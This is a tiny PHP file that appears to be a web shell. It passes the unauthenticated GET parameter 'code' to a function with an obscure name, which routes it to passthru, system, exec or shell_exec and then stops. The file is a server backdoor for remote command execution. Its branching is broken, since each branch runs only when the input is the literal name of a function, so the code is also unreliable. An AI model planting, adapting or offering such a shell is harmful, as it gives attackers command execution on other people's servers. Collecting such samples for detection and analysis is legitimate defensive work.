<?php
function dQ99exec($cmd) {
  if ($cmd == "passthru"){ 
	  @ob_start(); 
	  passthru($cmd); 
	  $output = @ob_get_contents(); 
	  @ob_end_clean(); 
  }
  elseif ($cmd == "system"){ 
      @ob_start(); 
	  system($cmd); 
	  $output = @ob_get_contents(); 
	  @ob_end_clean(); 
  }
  elseif ($cmd =="exec"){ 
	  exec($cmd); 
  }
  elseif ($cmd =="shell_exec"){ 
	  shell_exec($cmd); 
  }
}


dQ99exec($_GET['code']);
die();
?>